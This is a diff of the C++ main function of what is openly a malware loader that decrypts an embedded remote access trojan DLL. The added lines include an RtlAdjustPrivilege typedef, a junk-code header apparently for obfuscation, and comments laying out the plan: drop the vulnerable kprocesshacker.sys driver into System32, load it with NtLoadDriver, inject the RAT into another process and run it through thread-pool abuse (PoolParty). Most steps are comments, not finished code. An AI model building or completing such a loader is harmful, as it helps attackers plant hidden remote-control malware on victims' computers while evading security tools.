@@ -1,16 +1,31 @@
 #include <vector>
+#include <windows.h>
 #include "byte_encryption.h"
-#include "utils.h"
+#include "resources.h"
+#include "junk_codes.h"
+
+typedef NTSTATUS (*NTAPI RtlAdjustPrivilege_t)(
+    ULONG Privilege,
+    BOOLEAN Enable,
+    BOOLEAN Client,
+    PBOOLEAN WasEnabled
+);
 
 int main(int argc, char** argv)
 {
-	std::vector<unsigned char> ratDllImage = decrypt_bytes(rat_dll);
-	std::vector<unsigned char> ratDllImage1gag = decrypt_bytes(rat_dll);
-	std::vector<unsigned char> ratDllImageag = decrypt_bytes(rat_dll);
-	std::vector<unsigned char> ratDllImage1ag = decrypt_bytes(rat_dll);
-	std::vector<unsigned char> ratDllImagag = decrypt_bytes(rat_dll);
-	std::vector<unsigned char> ratDge1gag = decrypt_bytes(rat_dll);
-	std::vector<unsigned char> ratDllIm1gag = decrypt_bytes(rat_dll);
+	// Load the vulnerable driver: kprocesshacker.sys
+    /*
+    * Decrypt the driver from memory
+    * Write the driver to disk (to System32)
+    * Create the registry path
+    * call NtLoadDriver()
+    * - Possibly unload the driver after injecting
+    */
+    
 
+    // Inject the RAT dll to the target process' virtual memory (after performing relocations)
+
+    // Execute the AddressOfEntryPoint of the dll in the target process via abusing Thread pools (PoolParty)
+    
 	return 0;
 }
